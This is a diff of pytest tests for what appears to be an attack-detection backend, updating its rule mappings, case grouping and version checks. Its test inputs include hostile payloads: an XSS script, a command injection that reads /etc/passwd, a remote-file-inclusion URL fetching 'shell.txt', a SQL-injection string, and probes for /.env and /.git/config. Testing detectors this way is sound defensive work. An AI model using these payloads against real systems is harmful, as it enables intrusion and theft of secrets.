@@ -5,7 +5,7 @@ from pathlib import Path
 import pytest
 
 from backend.config import load_config
-from backend.rules import evaluate_incident, r01, r02, r03, r04, r07, r08
+from backend.rules import CREDENTIAL_RULES, evaluate_incident, r01, r02, r03, r04, r07, r08
 
 ROOT = Path(__file__).resolve().parents[2]
 CFG = load_config()
@@ -121,14 +121,16 @@ def web(path, query=None, etype="http_request", **attrs):
 def test_r07_finding_shape_and_techniques():
     out = r07.evaluate([web("/search", "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E")], CFG)
     assert len(out) == 1 and out[0]["web_attack_class"] == ["xss"]
-    assert out[0]["technique_ids"] == ["T1190", "T1059.007"] and out[0]["stage"] == "exploit_attempt"
+    # map@2: T1190 only; XSS-looking text is not JavaScript execution
+    assert out[0]["technique_ids"] == ["T1190"] and out[0]["stage"] == "exploit_attempt"
+    assert out[0]["mapping"][0]["status"] == "attempted" and out[0]["mapping_version"] == "map@2"
 
 
-def test_r07_multiple_classes_and_rfi_technique():
+def test_r07_multiple_classes_and_rfi_is_t1190_only():
     out = r07.evaluate([web("/ping", "host=127.0.0.1;cat /etc/passwd")], CFG)
     assert out[0]["web_attack_class"] == ["lfi", "cmd_injection"]
     rfi = r07.evaluate([web("/download", "file=http://192.168.77.10/shell.txt")], CFG)
-    assert "T1105" in rfi[0]["technique_ids"]
+    assert rfi[0]["web_attack_class"] == ["rfi"] and rfi[0]["technique_ids"] == ["T1190"]  # no T1105
 
 
 def test_r07_blocked_request_never_fires():
@@ -155,8 +157,18 @@ def _timed(e, at):
 
 
 def test_r08_five_hidden_paths_yes_four_no():
-    assert len(r08.evaluate(probes([0, 1, 2, 3, 4]), CFG)) == 1
-    assert r08.evaluate(probes([0, 1, 2, 3]), CFG) == []
+    def spread(offsets):
+        paths = ["/admin", "/.git/config", "/backup", "/admin/login.php", "/.env"]
+        return [_timed(web(paths[i % len(paths)]), t) for i, t in enumerate(offsets)]
+    assert len(r08.evaluate(spread([0, 1, 2, 3, 4]), CFG)) == 1
+    assert r08.evaluate(spread([0, 1, 2, 3]), CFG) == []
+
+
+def test_r08_reloads_of_one_hidden_path_are_not_scanning():
+    """map@2: five reloads of /admin are not wordlist scanning; 3+ distinct paths are needed."""
+    assert r08.evaluate(probes([0, 1, 2, 3, 4]), CFG) == []
+    two = [_timed(web(p), t) for t, p in enumerate(["/admin", "/backup"] * 3)]
+    assert r08.evaluate(two, CFG) == []
 
 
 def test_r08_spread_over_61s_no():
@@ -184,7 +196,7 @@ def test_r08_normal_pages_no():
 def test_finding_ids_are_stable_and_schema_complete():
     inc = {"incident_id": "inc_01", "src_ip": "192.168.77.10"}
     es = fails([0, 1, 2, 3, 4])
-    a, b = evaluate_incident(inc, es, CFG), evaluate_incident(inc, es, CFG)
+    a, b = evaluate_incident(inc, es, CFG, CREDENTIAL_RULES), evaluate_incident(inc, es, CFG, CREDENTIAL_RULES)
     assert a == b and a[0]["finding_id"].startswith("fnd_")
     required = {"finding_id", "rule_id", "rule_version", "incident_id", "src_ip", "technique_ids",
                 "stage", "label", "limitation", "evidence_event_ids"}
@@ -204,12 +216,16 @@ def raw(rid, sensor="ssh-decoy-01", etype="auth_failure", at=0, **attrs):
 
 
 def test_rules_run_after_each_insert_and_broadcast(client):
+    db = client.app.state.db
     with client.websocket_connect("/ws/events") as ws:
         for i in range(4):
             client.post("/api/ingest/events", json={"events": [raw(f"f{i}", at=i, username="u")]})
-        assert client.app.state.db.list_findings("inc_01") == []
+        assert [i["case_kind"] for i in db.list_incidents()] == ["ssh_session"]  # no credential case yet
         client.post("/api/ingest/events", json={"events": [raw("f4", at=4, username="u")]})
-        db_findings = client.app.state.db.list_findings("inc_01")
+        # R01 lives in its own credential_attempts case; the session case holds the events.
+        assert db.list_findings("inc_01") == [] and db.incident_summary("inc_01")["quiet"] is True
+        assert db.incident_summary("inc_02")["case_kind"] == "credential_attempts"
+        db_findings = db.list_findings("inc_02")
         assert [f["rule_id"] for f in db_findings] == ["R01"]
         types = []
         while True:
@@ -221,8 +237,8 @@ def test_rules_run_after_each_insert_and_broadcast(client):
         assert "finding" in types
     # same batch again: duplicates, no new finding
     r = client.post("/api/ingest/events", json={"events": [raw("f4", at=4, username="u")]}).json()
-    assert r["duplicates"] == 1 and len(client.app.state.db.list_findings("inc_01")) == 1
-    assert client.app.state.db.incident_summary("inc_01")["stages_observed"] == ["credential_attack"]
+    assert r["duplicates"] == 1 and len(db.list_findings("inc_02")) == 1
+    assert db.incident_summary("inc_02")["stages_observed"] == ["credential_attack"]
 
 
 def test_fixture_run_produces_expected_rules_once(client):
@@ -230,14 +246,19 @@ def test_fixture_run_produces_expected_rules_once(client):
     for _ in range(2):  # second post is all duplicates and must change nothing
         client.post("/api/ingest/events", json=fixture)
     db = client.app.state.db
-    rules = [f["rule_id"] for f in db.list_findings("inc_01")]
-    assert len(rules) == len(set(rules))  # each rule once for this fixture
-    assert {"R01", "R02", "R03", "R04", "R07"} <= set(rules)
-    assert db.incident_summary("inc_01")["stages_observed"] == [
-        "credential_attack", "exploit_attempt", "post_access", "data_access"]
+    cases = {(c["case_kind"], c["session_id"]): c for c in db.list_incidents()}
+    rules = {k: [f["rule_id"] for f in db.list_findings(c["incident_id"])] for k, c in cases.items()}
+    # 6 quiet Hydra sessions, one credential case, the logged-in session, one web activity case
+    assert sorted(k[0] for k in cases) == ["credential_attempts", "ssh_session", "ssh_session", "ssh_session",
+                                           "ssh_session", "ssh_session", "ssh_session", "ssh_session", "web_activity"]
+    assert rules[("credential_attempts", None)] == ["R01"]
+    assert rules[("ssh_session", "sess01")] == ["R02", "R03"]
+    assert sorted(rules[("web_activity", None)]) == ["R04", "R07", "R09"]
+    assert all(rules[("ssh_session", f"hyd{i}")] == [] and cases[("ssh_session", f"hyd{i}")]["quiet"] for i in range(6))
+    assert cases[("web_activity", None)]["stages_observed"] == ["exploit_attempt", "lure_access"]  # map@2
     # the blocked_request fixture event is evidence for nothing
     blocked_ids = {i["event_id"] for i in db.list_events()["items"] if i["event_type"] == "blocked_request"}
-    cited = {e for f in db.list_findings("inc_01") for e in f["evidence_event_ids"]}
+    cited = {e for c in cases.values() for f in db.list_findings(c["incident_id"]) for e in f["evidence_event_ids"]}
     assert blocked_ids and not (blocked_ids & cited)
 
 
@@ -316,9 +337,10 @@ def test_r01_login_kept_in_evidence_when_capped():
     assert len(out["evidence_event_ids"]) == 50 and out["evidence_event_ids"][-1] == es[-1]["event_id"]
 
 
-def test_changed_rules_carry_version_2():
-    assert r01.evaluate(fails([0, 1, 2, 3, 4]), CFG)[0]["rule_version"] == "R01@2"
-    assert r03.evaluate([ev(etype="command_input", command="ls")], CFG)[0]["rule_version"] == "R03@2"
-    assert r07.evaluate([web("/s", "q=' OR '1'='1")], CFG)[0]["rule_version"] == "R07@2"
+def test_changed_rules_carry_their_version():
+    # PR 4 (map@2): R01 distinct passwords, R02/R04 mapping, R03 quotes, R07 T1190 only, R08 distinct paths
+    assert r01.evaluate(fails([0, 1, 2, 3, 4]), CFG)[0]["rule_version"] == "R01@3"
+    assert r03.evaluate([ev(etype="command_input", command="ls")], CFG)[0]["rule_version"] == "R03@3"
+    assert r07.evaluate([web("/s", "q=' OR '1'='1")], CFG)[0]["rule_version"] == "R07@5"
     assert r02.evaluate([ev(etype="auth_success"), ev(etype="command_input", at=1, command="id")],
-                        CFG)[0]["rule_version"] == "R02@1"
+                        CFG)[0]["rule_version"] == "R02@2"
